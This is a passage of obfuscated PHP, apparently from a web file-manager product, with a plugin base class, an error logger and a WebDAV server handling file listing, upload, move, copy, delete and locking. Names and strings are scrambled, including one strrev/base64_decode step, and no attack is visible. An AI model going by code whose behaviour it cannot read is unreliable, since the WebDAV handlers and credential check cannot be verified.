E¡‡Öø¯£‘: } return $this->modelPlugin->setConfig($this->pluginName, $a·¢îôêßÑ); } public function onSetConfig($b¢ØŸíŒæˆ) { } public function onGetConfig($CèË‚‰Õ) { } public function onChangeStatus($Eğ»©†ˆ¾î) { } public function onUninstall() { } public function onInstall() { } public function authCheck($AÕ†‡¹İ“Ñ = "\160\154\165\147\151\x6e\101\165\x74\150") { $E·÷ÍÅ‘ìÁ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!defined($E·÷ÍÅ‘ìÁ[435])) { return !1; } if (_get($GLOBALS, $E·÷ÍÅ‘ìÁ[465])) { return !0; } $cÇÙ´¸¾ = $this->getConfig(); if (!$cÇÙ´¸¾[$AÕ†‡¹İ“Ñ]) { return !1; } return ActionCall($E·÷ÍÅ‘ìÁ[1373], $cÇÙ´¸¾[$AÕ†‡¹İ“Ñ]); } public function url($D„•¡åË¾­, $F”ƒ¸Ú‘… = '', $e¹ÙË¿¶•• = true) { goto c¶ªáƒÁÒ–; c¶ªáƒÁÒ–: $DÔÔò¥«’á =& $_SERVER[¶ªÕß‚ØÁŸ]; $dİ­ôšƒÌ = $this->getConfig(); $cÅÔœÅË’ = KOD_VERSION . $DÔÔò¥«’á[101] . KOD_VERSION_BUILD; goto F™Ç»æÚÒ©; Dì¶ËâÄˆ: if (!$e¹ÙË¿¶••) { return $aÛ±ÂÆ¶¯Ò; } echo $aÛ±ÂÆ¶¯Ò; goto cÉå‰òØƒç; F™Ç»æÚÒ©: $c¿‘¦ºù„Ö = $this->packageVersion(); $BÚÇÆØº² = $cÅÔœÅË’ . $DÔÔò¥«’á[420] . $c¿‘¦ºù„Ö; if (substr($D„•¡åË¾­, 0, 4) == $DÔÔò¥«’á[154] || substr($D„•¡åË¾­, 0, 2) == $DÔÔò¥«’á[1158]) { $aÛ±ÂÆ¶¯Ò = $D„•¡åË¾­ . $DÔÔò¥«’á[1374] . $BÚÇÆØº²; } else { if ($F”ƒ¸Ú‘… == $DÔÔò¥«’á[33]) { $aÛ±ÂÆ¶¯Ò = $this->pluginHost . $D„•¡åË¾­ . $DÔÔò¥«’á[1374] . $BÚÇÆØº²; } else { if ($F”ƒ¸Ú‘… === $DÔÔò¥«’á[86]) { $aÛ±ÂÆ¶¯Ò = $this->pluginHost . $D„•¡åË¾­; } else { if ($F”ƒ¸Ú‘… == $DÔÔò¥«’á[1375]) { $aÛ±ÂÆ¶¯Ò = STATIC_PATH . $D„•¡åË¾­ . $DÔÔò¥«’á[1374] . $cÅÔœÅË’; } else { if ($F”ƒ¸Ú‘… == $DÔÔò¥«’á[1376]) { $aÛ±ÂÆ¶¯Ò = APP_HOST . $DÔÔò¥«’á[1377] . $D„•¡åË¾­ . $DÔÔò¥«’á[1374] . $cÅÔœÅË’; } else { if (isset($dİ­ôšƒÌ[$F”ƒ¸Ú‘…])) { $aÛ±ÂÆ¶¯Ò = $dİ­ôšƒÌ[$F”ƒ¸Ú‘…] . $D„•¡åË¾­ . $DÔÔò¥«’á[1374] . $BÚÇÆØº²; } } } } } } goto Dì¶ËâÄˆ; cÉå‰òØƒç: } public function link($c¥ÆùŞõ‡ = false, $f•Ö¦†­£Ù = '') { $EÁ¡ˆ¡°±Ä =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$c¥ÆùŞõ‡) { $this->link($EÁ¡ˆ¡°±Ä[1378], $EÁ¡ˆ¡°±Ä[1376]); $this->link($EÁ¡ˆ¡°±Ä[1379], $EÁ¡ˆ¡°±Ä[1375]); $this->link($EÁ¡ˆ¡°±Ä[1380], $EÁ¡ˆ¡°±Ä[1375]); $this->link($EÁ¡ˆ¡°±Ä[1381], $EÁ¡ˆ¡°±Ä[1375]); $this->link($EÁ¡ˆ¡°±Ä[1382], $EÁ¡ˆ¡°±Ä[1375]); return; } $C˜ˆè„ˆğ½ = $this->url($c¥ÆùŞõ‡, $f•Ö¦†­£Ù, !1); if (substr($c¥ÆùŞõ‡, -3) == $EÁ¡ˆ¡°±Ä[1383]) { echo $EÁ¡ˆ¡°±Ä[1384] . $C˜ˆè„ˆğ½ . $EÁ¡ˆ¡°±Ä[1385] . $EÁ¡ˆ¡°±Ä[62]; } else { if (substr($c¥ÆùŞõ‡, -4) == $EÁ¡ˆ¡°±Ä[1386]) { echo $EÁ¡ˆ¡°±Ä[1387] . $C˜ˆè„ˆğ½ . $EÁ¡ˆ¡°±Ä[1388] . $EÁ¡ˆ¡°±Ä[62]; } } } } goto cÎ‹Œ„˜æ¿; DôÎÉƒ»Ì®: function beforeShutdownError($fôÔ¨ˆ»† = false, $Fë±À†¡çè = '', $a–â—Ÿëô´ = '', $f¬ùÇ¡îÎ¥ = 0) { $e´õƒ¥æ«Ï =& $_SERVER[œˆâ˜åÊâè]; switch ($fôÔ¨ˆ»†) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $C†•”ÖåÂ = $e´õƒ¥æ«Ï[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $C†•”ÖåÂ = $e´õƒ¥æ«Ï[40]; break; case E_STRICT: $C†•”ÖåÂ = $e´õƒ¥æ«Ï[41]; break; case E_NOTICE: case E_USER_NOTICE: $C†•”ÖåÂ = $e´õƒ¥æ«Ï[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $C†•”ÖåÂ = $e´õƒ¥æ«Ï[43]; break; default: break; } if (!$C†•”ÖåÂ || $C†•”ÖåÂ == $e´õƒ¥æ«Ï[42] || $C†•”ÖåÂ == $e´õƒ¥æ«Ï[43]) { return; } $a–â—Ÿëô´ = $e´õƒ¥æ«Ï[4] . str_replace($_SERVER[$e´õƒ¥æ«Ï[37]], $e´õƒ¥æ«Ï[20], $a–â—Ÿëô´); $DËÀàĞàö– = $C†•”ÖåÂ . $e´õƒ¥æ«Ï[44] . $Fë±À†¡çè . $e´õƒ¥æ«Ï[44] . $a–â—Ÿëô´ . $e´õƒ¥æ«Ï[44] . $f¬ùÇ¡îÎ¥; write_log($DËÀàĞàö– . $e´õƒ¥æ«Ï[18] . get_caller_msg(1), $e´õƒ¥æ«Ï[19]); } $_SERVER[$_SERVER[œˆâ˜åÊâè][45]] = $_SERVER[$_SERVER[œˆâ˜åÊâè][37]] . $_SERVER[œˆâ˜åÊâè][46]; $C·¸Ì…ç„ = strrev(base64_decode($_SERVER[œˆâ˜åÊâè][47])); goto eÖØˆ±†™ ; BÜÊ¢·åÖó: class HttpDavServer { public function __construct($E‹ø‰‹¬“©, $aìÆù—ƒ¾) { $this->root = $E‹ø‰‹¬“©; $this->initPath($aìÆù—ƒ¾); $this->start(); } public function initPath($a¢ß†¾¡Ğ) { $B¬êÙ›øà =& $_SERVER[¶ªÕß‚ØÁŸ]; $DîÖ„¤‰¢Ø = rtrim($_SERVER[$B¬êÙ›øà[1391]], $B¬êÙ›øà[8]) . $B¬êÙ›øà[8]; $this->urlBase = substr($DîÖ„¤‰¢Ø, 0, strpos($DîÖ„¤‰¢Ø, $a¢ß†¾¡Ğ) + 1); $this->urlBase = rtrim($this->urlBase, $B¬êÙ›øà[8]) . $a¢ß†¾¡Ğ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $cêàÊ¸ï½ =& $_SERVER[¶ªÕß‚ØÁŸ]; $E–†¼Ö©Çœ = HttpAuth::get(); if ($E–†¼Ö©Çœ[$cêàÊ¸ï½[543]] == $cêàÊ¸ï½[1787] && $E–†¼Ö©Çœ[$cêàÊ¸ï½[903]] == $cêàÊ¸ï½[1788]) { return !0; } HttpAuth::error(); } public function start() { goto BÎ½â¿•; d³éŠÏ¯„±: if (!$B¯­ã‚¾´) { return; } self::response($B¯­ã‚¾´); goto A§‹šîÚ‹ø; BÎ½â¿•: $Dç†ôàØÌê =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->checkUser(); $dÇ¦Îß§Õ = $Dç†ôàØÌê[154] . HttpHeader::method(); goto D›‰ğˆ¿Ãà; D›‰ğˆ¿Ãà: if (!method_exists($this, $dÇ¦Îß§Õ)) { pr($dÇ¦Îß§Õ . $Dç†ôàØÌê[1789]); die; } $F‚ÍøñøƒŒ = array($Dç†ôàØÌê[1790], $Dç†ôàØÌê[1791]); if (!in_array($dÇ¦Îß§Õ, $F‚ÍøñøƒŒ) && !$this->pathExists($this->path)) { $B¯­ã‚¾´ = array($Dç†ôàØÌê[1036] => 404); } else { $B¯­ã‚¾´ = $this->{$dÇ¦Îß§Õ}(); } goto d³éŠÏ¯„±; A§‹šîÚ‹ø: } public function pathGet($aĞÊ×¬¢ = false) { $béĞğÅ¼µš =& $_SERVER[¶ªÕß‚ØÁŸ]; $d±Œ£É«ğÓ = $aĞÊ×¬¢ ? $_SERVER[$béĞğÅ¼µš[1792]] : $_SERVER[$béĞğÅ¼µš[1391]]; $d±Œ£É«ğÓ = KodIO::clear(rawurldecode($d±Œ£É«ğÓ)); if (!strstr($d±Œ£É«ğÓ, KodIO::clear($this->urlBase))) { return !1; } return substr($d±Œ£É«ğÓ, strpos($d±Œ£É«ğÓ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($B…­ğš×) { return file_exists($B…­ğš×); } public function pathMkdir($B¯Á»åæß‘) { return mkdir($B¯Á»åæß‘, 511, !0); } public function pathInfo($e¸Üºøß) { return path_info($e¸Üºøß); } public function pathList($Eï–ƒà°Ï) { return path_list($Eï–ƒà°Ï); } public function pathOut($a­‰‚™ºÄÍ) { echo file_get_contents($a­‰‚™ºÄÍ); } public function pathPut($EƒÃõáŸ’±, $fèÅ»Òî = '') { if (!$fèÅ»Òî) { return file_put_contents($EƒÃõáŸ’±, $_SERVER[¶ªÕß‚ØÁŸ][33]); } return move_path($fèÅ»Òî, $EƒÃõáŸ’±); } public function pathRemove($a¥øÚÀÔËÖ) { if (is_file($a¥øÚÀÔËÖ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($a²ùœ’èµµ, $cÂ…¶ï²ª) { return move_path($a²ùœ’èµµ, $cÂ…¶ï²ª); } public function pathCopy($a«™‚î³Ú, $eù„ƒéŒÑ–) { return copy_dir($a«™‚î³Ú, $eù„ƒéŒÑ–); } public function parsePath($DŞ–„ÔÀŠ) { return $DŞ–„ÔÀŠ; } public function parseItem($e½¯¶Ø¼…, $EªºèŠˆ˜) { goto DäŞÀ¶¿î; DäŞÀ¶¿î: $cÉˆº¥Ò‰Å =& $_SERVER[¶ªÕß‚ØÁŸ]; $fºŒ‚²¦´ = $this->pathGet() . $cÉˆº¥Ò‰Å[8] . $e½¯¶Ø¼…[$cÉˆº¥Ò‰Å[28]]; $fºŒ‚²¦´ = $cÉˆº¥Ò‰Å[8] . str_replace($cÉˆº¥Ò‰Å[182], $cÉˆº¥Ò‰Å[8], rawurlencode($fºŒ‚²¦´)); goto B™¼†ˆ•˜˜; B™¼†ˆ•˜˜: if ($EªºèŠˆ˜) { $fºŒ‚²¦´ = $cÉˆº¥Ò‰Å[8] . str_replace($cÉˆº¥Ò‰Å[182], $cÉˆº¥Ò‰Å[8], rawurlencode($this->pathGet())); } if (!trim($e½¯¶Ø¼…[$cÉˆº¥Ò‰Å[117]])) { $e½¯¶Ø¼…[$cÉˆº¥Ò‰Å[117]] = time(); } if (!trim($e½¯¶Ø¼…[$cÉˆº¥Ò‰Å[197]])) { $e½¯¶Ø¼…[$cÉˆº¥Ò‰Å[197]] = time(); } goto F³ƒÜ¶»—; F³ƒÜ¶»—: $E‘ÚÛŒñìÛ = array($cÉˆº¥Ò‰Å[1793] => KodIO::clear($this->urlBase . $fºŒ‚²¦´), $cÉˆº¥Ò‰Å[117] => @gmdate($cÉˆº¥Ò‰Å[1794], $e½¯¶Ø¼…[$cÉˆº¥Ò‰Å[117]]), $cÉˆº¥Ò‰Å[197] => @gmdate($cÉˆº¥Ò‰Å[1795], $e½¯¶Ø¼…[$cÉˆº¥Ò‰Å[197]]), $cÉˆº¥Ò‰Å[87] => $e½¯¶Ø¼…[$cÉˆº¥Ò‰Å[87]] ? $e½¯¶Ø¼…[$cÉˆº¥Ò‰Å[87]] : 0); return $E‘ÚÛŒñìÛ; goto cÚã¦ÈÏ®…; cÚã¦ÈÏ®…: } public function parseItemXml($bñ¼Îê¤¸¡, $e†ˆ–Ş¾×) { $eÄ¼ä¥ÉÀ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c•Ñ·Ş·ñ³ = $this->parseItem($bñ¼Îê¤¸¡, $e†ˆ–Ş¾×); if ($bñ¼Îê¤¸¡[$eÄ¼ä¥ÉÀ[29]] == $eÄ¼ä¥ÉÀ[86]) { $cØÅ¦Û‘êš = $eÄ¼ä¥ÉÀ[1796]; $cØÅ¦Û‘êš .= $eÄ¼ä¥ÉÀ[1797]; } else { $cÁ‡©Ô©Ìñ = $bñ¼Îê¤¸¡[$eÄ¼ä¥ÉÀ[170]] ? $bñ¼Îê¤¸¡[$eÄ¼ä¥ÉÀ[170]] : get_path_ext($bñ¼Îê¤¸¡[$eÄ¼ä¥ÉÀ[28]]); $A±š–ó…ª = get_file_mime($cÁ‡©Ô©Ìñ); $cØÅ¦Û‘êš = $eÄ¼ä¥ÉÀ[1798]; $cØÅ¦Û‘êš .= "\x3c\x44\72\147\x65\164\143\157\x6e\164\x65\156\x74\164\171\x70\145\76{$A±š–ó…ª}\74\57\x44\x3a\147\145\164\143\157\156\x74\145\x6e\164\x74\171\x70\145\x3e"; } return "\xa\x9\11\x3c\x44\x3a\162\x65\163\160\157\156\163\145\76\12\x9\11\x9\74\104\72\x68\162\145\146\76{$c•Ñ·Ş·ñ³[$eÄ¼ä¥ÉÀ[1793]]}\74\x2f\104\72\150\162\145\146\x3e\12\11\x9\11\74\x44\x3a\160\162\x6f\160\163\x74\x61\x74\76\12\x9\11\x9\x9\x3c\104\x3a\x70\162\x6f\160\x3e\12\11\x9\11\x9\x9\x3c\x44\x3a\x67\145\164\154\x61\163\x74\155\x6f\x64\x69\146\151\x65\144\76{$c•Ñ·Ş·ñ³[$eÄ¼ä¥ÉÀ[117]]}\74\57\x44\72\147\x65\164\x6c\x61\163\x74\155\157\x64\x69\146\151\145\x64\x3e\xa\11\11\11\x9\x9\74\104\x3a\x63\x72\x65\141\164\151\x6f\156\x64\x61\x74\145\76{$c•Ñ·Ş·ñ³[$eÄ¼ä¥ÉÀ[197]]}\74\57\x44\72\x63\162\x65\x61\x74\x69\x6f\x6e\x64\x61\164\x65\x3e\12\x9\x9\11\11\11\74\104\x3a\147\x65\164\x63\x6f\156\164\145\x6e\x74\x6c\x65\x6e\147\164\x68\76{$c•Ñ·Ş·ñ³[$eÄ¼ä¥ÉÀ[87]]}\74\57\x44\72\147\145\164\x63\157\x6e\164\x65\156\x74\x6c\x65\156\x67\x74\150\x3e\xa\11\11\11\x9\x9{$cØÅ¦Û‘êš}\xa\11\x9\11\11\x3c\x2f\104\x3a\x70\162\157\160\x3e\xa\11\x9\11\11\74\x44\72\163\x74\141\x74\x75\x73\76\110\x54\124\120\57\x31\56\61\x20\62\x30\60\x20\x4f\x4b\74\57\104\x3a\x73\x74\141\164\165\163\76\xa\11\11\x9\x3c\57\x44\72\160\162\x6f\160\x73\x74\x61\164\x3e\12\11\11\x3c\x2f\x44\x3a\x72\x65\x73\x70\157\x6e\163\x65\76"; } public function pathListMerge($e‹ääÆÌãÑ) { goto aÆõ¯ƒùé; bƒ¤±ë‹©‡: return $AñÚ…°¢ñˆ; goto A÷ÃŸÂì÷Ø; BíŠŠÃàÚ : $AñÚ…°¢ñˆ = array(); foreach ($e‹ääÆÌãÑ as $DÇĞËÈ²– => $e¡‡ö¢©Ê) { if (!in_array($DÇĞËÈ²–, $f¡ŠŠ©Ó‘…) || !is_array($e¡‡ö¢©Ê)) { continue; } $AñÚ…°¢ñˆ = array_merge($AñÚ…°¢ñˆ, $e¡‡ö¢©Ê); } foreach ($AñÚ…°¢ñˆ as &$fˆÓó¥¯çá) { $fˆÓó¥¯çá[$cª†ßÔñÓ[28]] = str_replace($cª†ßÔñÓ[8], $cª†ßÔñÓ[1393], $fˆÓó¥¯çá[$cª†ßÔñÓ[28]]); } goto bƒ¤±ë‹©‡; aÆõ¯ƒùé: $cª†ßÔñÓ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$e‹ääÆÌãÑ) { return $e‹ääÆÌãÑ; } $f¡ŠŠ©Ó‘… = array($cª†ßÔñÓ[83], $cª†ßÔñÓ[84], $cª†ßÔñÓ[1799]); goto BíŠŠÃàÚ ; A÷ÃŸÂì÷Ø: } public function httpPROPFIND() { goto fºÒÍö°’¨; AØÊñ×¬ä´: $aÈ‡Ş¨â È = $C™áŠ¯¿—Ÿ[$C¬…¤ò¤È«[1800]]; if (!is_array($bñÅ´ÌàÇ™) || $aÈ‡Ş¨â È[$C¬…¤ò¤È«[1801]] === !1) { return array($C¬…¤ò¤È«[1802] => 404, $C¬…¤ò¤È«[1803] => $C¬…¤ò¤È«[1804]); } $eŸÊ©„Œ®” = $aÈ‡Ş¨â È[$C¬…¤ò¤È«[29]] == $C¬…¤ò¤È«[177] || HttpHeader::get($C¬…¤ò¤È«[1779]) == $C¬…¤ò¤È«[476]; goto b©ƒØêæ½Ü; b× öã¡é: return array($C¬…¤ò¤È«[1802] => 207, $C¬…¤ò¤È«[1803] => "\74\104\72\155\x75\154\x74\x69\x73\164\141\x74\165\x73\40\170\x6d\154\156\x73\x3a\x44\x3d\x22\104\x41\126\x3a\42\x3e\xa{$dŒèñËÕ…}\xa\x3c\x2f\104\72\155\165\x6c\164\x69\x73\x74\141\x74\x75\163\76"); goto aªöÍˆ×¥¥; b©ƒØêæ½Ü: if ($eŸÊ©„Œ®”) { $bñÅ´ÌàÇ™ = array($aÈ‡Ş¨â È); } else { $aÈ‡Ş¨â È[$C¬…¤ò¤È«[28]] = $C¬…¤ò¤È«[33]; $bñÅ´ÌàÇ™ = array_merge(array($aÈ‡Ş¨â È), $bñÅ´ÌàÇ™); } $dŒèñËÕ… = $C¬…¤ò¤È«[33]; foreach ($bñÅ´ÌàÇ™ as $c¿Ë…¼Ä”ñ) { $dŒèñËÕ… .= $this->parseItemXml($c¿Ë…¼Ä”ñ, $eŸÊ©„Œ®”); } goto b× öã¡é; fºÒÍö°’¨: $C¬…¤ò¤È« =& $_SERVER[¶ªÕß‚ØÁŸ]; $C™áŠ¯¿—Ÿ = $this->pathList($this->path); $bñÅ´ÌàÇ™ = $this->pathListMerge($C™áŠ¯¿—Ÿ); goto AØÊñ×¬ä´; aªöÍˆ×¥¥: } public function httpHEAD() { $dÉ¯Â›¾ñ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A“äÔ‚î— = $this->pathInfo($this->path); if (!$A“äÔ‚î— || $A“äÔ‚î—[$dÉ¯Â›¾ñ[29]] == $dÉ¯Â›¾ñ[86]) { return array($dÉ¯Â›¾ñ[1036] => 200, $dÉ¯Â›¾ñ[1210] => array($dÉ¯Â›¾ñ[1805])); } return array($dÉ¯Â›¾ñ[1036] => 200, $dÉ¯Â›¾ñ[1210] => array($dÉ¯Â›¾ñ[1806], $dÉ¯Â›¾ñ[146], $dÉ¯Â›¾ñ[1807] . $A“äÔ‚î—[$dÉ¯Â›¾ñ[87]], $dÉ¯Â›¾ñ[1808] . get_file_mime($A“äÔ‚î—[$dÉ¯Â›¾ñ[170]]), $dÉ¯Â›¾ñ[142] . gmdate($dÉ¯Â›¾ñ[1794], $A“äÔ‚î—[$dÉ¯Â›¾ñ[1258]]) . $dÉ¯Â›¾ñ[1809], $dÉ¯Â›¾ñ[1810])); } public function httpOPTIONS() { $EÃ›«ëö— =& $_SERVER[¶ªÕß‚ØÁŸ]; return array($EÃ›«ëö—[1036] => 200, $EÃ›«ëö—[1210] => array($EÃ›«ëö—[1811], $EÃ›«ëö—[1812], $EÃ›«ëö—[1813], $EÃ›«ëö—[1267])); } public function httpPROPPATCH() { $bó©ˆêÉÚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EåÙ¡¼ÅŠ˜ = $bó©ˆêÉÚ[1814] . $_SERVER[$bó©ˆêÉÚ[1391]] . $bó©ˆêÉÚ[1815]; return array($bó©ˆêÉÚ[1802] => 207, $bó©ˆêÉÚ[1803] => "\74\x44\72\x6d\x75\154\x74\151\x73\164\141\164\165\x73\x20\170\155\x6c\x6e\x73\x3a\x44\75\42\x44\x41\x56\x3a\42\76\xa{$EåÙ¡¼ÅŠ˜}\xa\x3c\x2f\104\72\155\165\x6c\x74\x69\x73\x74\141\x74\165\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $e²ì‹à¼ƒ„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c¹Ö·–×¯ = $this->uploadFile(); if ($c¹Ö·–×¯) { $D°©Èç± „ = 204; } else { $c¹Ö·–×¯ = $e²ì‹à¼ƒ„[33]; $D°©Èç± „ = 201; } $fĞ¢¾²íñ’ = $this->pathPut($this->path, $c¹Ö·–×¯); if ($fĞ¢¾²íñ’ == !1) { $D°©Èç± „ = 404; } return array($e²ì‹à¼ƒ„[1802] => $D°©Èç± „); } private function uploadFile() { goto aÉÚÕƒŒ£; eÒˆÖ§› ®: $BÀ¹Âƒİ‰ = @fopen($Eì¸®ÒŠØ, $fì»¨¢‚Á[1525]); $Dƒ¶Ñ¶»á = @fopen($fì»¨¢‚Á[1817], $fì»¨¢‚Á[1524]); if (!$Dƒ¶Ñ¶»á || !$BÀ¹Âƒİ‰) { @unlink($Eì¸®ÒŠØ); return !1; } goto BÆ•Ğïˆ»; BÆ•Ğïˆ»: while (!feof($Dƒ¶Ñ¶»á)) { fwrite($BÀ¹Âƒİ‰, fread($Dƒ¶Ñ¶»á, 1024 * 200)); } fclose($Dƒ¶Ñ¶»á); fclose($BÀ¹Âƒİ‰); goto côôª óì¡; aÉÚÕƒŒ£: $fì»¨¢‚Á =& $_SERVER[¶ªÕß‚ØÁŸ]; @mk_dir(TEMP_FILES); $Eì¸®ÒŠØ = TEMP_FILES . $fì»¨¢‚Á[1816] . rand_string(32); goto eÒˆÖ§› ®; côôª óì¡: if (@filesize($Eì¸®ÒŠØ) > 0) { return $Eì¸®ÒŠØ; } @unlink($Eì¸®ÒŠØ); return !1; goto cÔñ·‹Œ¨Ñ; cÔñ·‹Œ¨Ñ: } public function httpMKCOL() { $Dôğíƒ¿÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->pathExists($this->path)) { return array($Dôğíƒ¿÷[1036] => 409); } $C¿‘ÏçôÇ = $this->pathMkdir($this->path); return array($Dôğíƒ¿÷[1036] => $C¿‘ÏçôÇ ? 201 : 403); } public function httpMOVE() { $Bë¥Çá´’‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F²îï°ÅÖ† = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$Bë¥Çá´’‹[1818]])) { $eæ¶¡¿ƒá[$Bë¥Çá´’‹[1819]] = $_SERVER[$Bë¥Çá´’‹[1818]] == $Bë¥Çá´’‹[1820]; } $cí½¿Şò°Ö = $this->pathMove($this->path, $F²îï°ÅÖ†); return array($Bë¥Çá´’‹[1036] => $cí½¿Şò°Ö ? 201 : 404); } public function httpCOPY() { $cÏ¾•å¶ˆ  = $this->parsePath($this->pathGet(!0)); $Fº¶ªĞìˆÃ = $this->pathCopy($this->path, $cÏ¾•å¶ˆ ); return array($_SERVER[¶ªÕß‚ØÁŸ][1036] => $Fº¶ªĞìˆÃ ? 201 : 404); } public function httpDELETE() { $a‡¡ß›ñë‚ = $this->pathRemove($this->path); return array($_SERVER[¶ªÕß‚ØÁŸ][1036] => $a‡¡ß›ñë‚ ? 200 : 503); } public function httpLOCK() { $AÅÔá¦‡Ï =& $_SERVER[¶ªÕß‚ØÁŸ]; $EùñÊÃÏ† = md5($this->path); $AÌõ×Â—Ã” = $AÅÔá¦‡Ï[1821] . $this->xmlGet($AÅÔá¦‡Ï[1822]) . $AÅÔá¦‡Ï[1823] . $EùñÊÃÏ† . $AÅÔá¦‡Ï[1824]; return array($AÅÔá¦‡Ï[1036] => 200, $AÅÔá¦‡Ï[1210] => array($AÅÔá¦‡Ï[1825] . $EùñÊÃÏ†, $AÅÔá¦‡Ï[1826]), $AÅÔá¦‡Ï[1827] => $AÌõ×Â—Ã”); } public function httpUNLOCK() { return array($_SERVER[¶ªÕß‚ØÁŸ][1036] => 204); } public function xmlGet($b‚Æ¹ĞÈ‡²) { goto DÔ—ä‘Ôñƒ; DÔ—ä‘Ôñƒ: $bœ»ãäï¹µ =& $_SERVER[¶ªÕß‚ØÁŸ]; static $DİàŞá‚ĞÔ = false; if (!$DİàŞá‚ĞÔ) { $BÕ¬‘ÀàßÆ = file_get_contents($bœ»ãäï¹µ[1828]); $DİàŞá‚ĞÔ = new DOMDocument(); $DİàŞá‚ĞÔ->loadXML($BÕ¬‘ÀàßÆ); } goto Bñ¦è°ªµ; Bñ¦è°ªµ: $dÙİ®õ×¸Ü = array_shift(explode($bœ»ãäï¹µ[8], $b‚Æ¹ĞÈ‡²)); $bì•’øƒÛ = $DİàŞá‚ĞÔ->getElementsByTagNameNS($bœ»ãäï¹µ[1829], $dÙİ®õ×¸Ü); if ($bì•’øƒÛ) { return $bì•’øƒÛ[0]->nodeValue; } goto dÄÀ…¢Áà›; dÄÀ…¢Áà›: return $bœ»ãäï¹µ[33]; goto dÈ…ñÄÈë; dÈ…ñÄÈë: } public static function response($Aö¨¸éâæÁ) { goto Aè¾Ò’š¢“; Aè¾Ò’š¢“: $Cƒâ´Çô®£ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e¥©³–í„ª = is_array($Aö¨¸éâæÁ[$Cƒâ´Çô®£[1210]]) ? $Aö¨¸éâæÁ[$Cƒâ´Çô®£[1210]] : array(); $e¥©³–í„ª[] = HttpHeader::code($Aö¨¸éâæÁ[$Cƒâ´Çô®£[1036]]); goto cÕŒÈ·á†Ü; cÕŒÈ·á†Ü: $e¥©³–í„ª[] = $Cƒâ´Çô®£[1769]; $e¥©³–í„ª[] = $Cƒâ´Çô®£[1770]; foreach ($e¥©³–í„ª as $BÈ¥Ã„ˆŠÏ) { header($BÈ¥Ã„ˆŠÏ); } goto e– ßïê‹; e– ßïê‹: if (is_string($Aö¨¸éâæÁ[$Cƒâ´Çô®£[1827]])) { header($Cƒâ´Çô®£[1830]); $BƒÀ´ğÎÜƒ = $Cƒâ´Çô®£[1831] . $Cƒâ´Çô®£[62] . $Aö¨¸éâæÁ[$Cƒâ´Çô®£[1827]]; echo $BƒÀ´ğÎÜƒ; } goto bÒ·µ­…ğÁ; bÒ·µ­…ğÁ: } } class HttpHeader { public static $_headers = array("\x48\157\163\x74" => "\110\x54\x54\x50\137\x48\x4f\x53\124", "\x55\x73\x65\162\55\101\147\x65\x6e\x74" => "\110\124\124\120\x5f\x55\123\x45\x52\137\101\x47\x45\116\124", "\x43\x6f\156\x74\x65\x6e\164\55\124\171\x70\145" => "\x48\124\124\x50\x5f\103\x4f\116\124\105\116\124\x5f\x54\x59\x50\105", "\x43\x6f\156\164\145\x6e\x74\55\x4c\145\156\x67\x74\150" => "\x48\124\124\120\x5f\x43\117\x4e\x54\105\116\x54\x5f\114\x45\x4e\107\124\110", "\x44\145\x70\x74\150" => "\110\124\124\x50\137\104\x45\x50\124\x48", "\x45\170\160\x65\143\164" => "\110\x54\124\x50\x5f\x45\130\x50\105\x43\x54", "\x49\x66\55\x4e\x6f\156\x65\55\x4d\x61\164\143\150" => "\110\124\x54\x50\137\x49\106\x5f\x4e\x4f\116\x45\137\115\101\124\x43\110", "\111\x66\x2d\x4d\x61\x74\143\x68" => "\110\x54\124\x50\x5f\x49\x46\137\x4d\101\x54\103\110", "\111\x66\55\122\x61\156\147\145" => "\x48\124\x54\120\137\x49\106\x5f\x52\101\116\x47\x45", "\114\x61\x73\x74\x2d\115\x6f\x64\x69\146\151\x65\x64" => "\x48\x54\124\x50\137\x4c\x41\123\x54\137\x4d\x4f\x44\111\106\111\105\104", "\111\x66\x2d\x4d\157\144\x69\x66\x69\145\144\x2d\123\x69\x6e\143\145" => "\x48\124\x54\120\x5f\111\x46\137\115\117\104\x49\x46\x49\x45\104\137\123\x49\x4e\x43\105", "\111\146\x2d\125\x6e\x6d\x6f\x64\151\146\151\145\144\55\123\151\156\143\x65" => "\110\x54\124\120\x5f\x49\x46\x5f\x55\116\x4d\117\x44\x49\x46\111\105\x44\x5f\123\x49\116\103\105", "\x52\x61\156\x67\145" => "\110\124\124\x50\137\122\101\x4e\107\105", "\x54\151\155\x65\x6f\165\x74" => "\x48\124\124\120\137\x54\111\115\x45\117\125\124", "\x49\x66" => "\110\124\124\x50\x5f\111\x46", "\x4c\157\x63\153\x2d\124\x6f\x6b\145\156" => "\x48\x54\124\x50\x5f\x4c\x4f\x43\113\137\x54\x4f\113\x45\116", "\x4f\166\x65\x72\x77\x72\x69\x74\145" => "\x48\x54\124\x50\x5f\x4f\126\105\x52\x57\122\x49\x54\x45", "\x44\145\x73\x74\151\156\x61\x74\x69\x6f\156" => "\110\124\x54\x50\137\x44\105\x53\124\x49\x4e\x41\x54\111\x4f\116", "\x52\145\x71\x75\x65\163\x74\x2d\x49\x64" => "\122\105\x51\125\105\x53\124\x5f\111\104", "\122\x65\161\x75\x65\163\x74\x2d\x42\157\x64\x79\55\106\151\154\145" => "\x52\x45\x51\125\105\x53\124\137\102\x4f\104\131\x5f\x46\x49\114\105", "\x52\x65\144\151\162\x65\x63\x74\x2d\123\164\141\164\165\163" => "\122\105\x44\111\x52\x45\103\124\137\x53\124\101\124\125\x53"); public static function init() { static $D÷ºã¿ã¹í = false; if ($D÷ºã¿ã¹í) { return; } foreach ($_SERVER as $bóÊ‚²½Ï => 